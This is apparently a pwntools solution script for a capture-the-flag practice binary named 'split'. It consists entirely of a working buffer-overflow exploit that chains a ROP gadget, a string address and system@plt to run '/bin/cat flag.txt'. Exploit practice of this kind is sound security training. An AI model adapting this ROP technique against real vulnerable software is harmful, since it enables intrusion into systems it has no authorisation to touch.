from pwn import *

p = process("./split")

system_addr = 0x4005e0	#system@plt
# 400810  call system@plt
ropgadget = 0x400883
str_addr = 0x601060	#/bin/cat flag.txt

payload = ''
payload += "A"*40
payload += p64(ropgadget)
payload += p64(str_addr)
payload +=p64(system_addr)

p.sendline(payload)
p.interactive()
